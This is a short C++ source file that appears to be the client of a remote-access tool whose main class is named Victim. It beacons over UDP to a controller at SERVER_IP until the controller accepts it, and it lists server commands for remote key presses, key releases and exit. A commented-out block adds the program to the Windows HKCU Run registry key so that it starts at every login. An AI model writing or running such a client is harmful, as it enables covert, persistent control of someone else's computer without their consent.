#include "victim.h"
#include <thread>

/* possible messages form server:
v: victim accepted
e: exit
n: key pressed
m: key released
*/

int main()
{
    auto connectServer = [](sf::UdpSocket& s, bool& connected) {
        while (!connected)
        {
            std::string init = "v" + std::to_string(int(Mlib::getTime() / 1000));
            s.send(init.c_str(), init.size(), SERVER_IP, SERVER_PORT);
            Mlib::sleep(2000);
        }
    };

    /*std::wstring progPath = L"C:\\Users\\feder\\Desktop\\Controller\\x64\\Release\\Victim.exe";
    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);   
    LONG status = RegSetValueEx(hkey, L"Victim", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));*/


    Victim victim;

    return victim.controlVictim();
}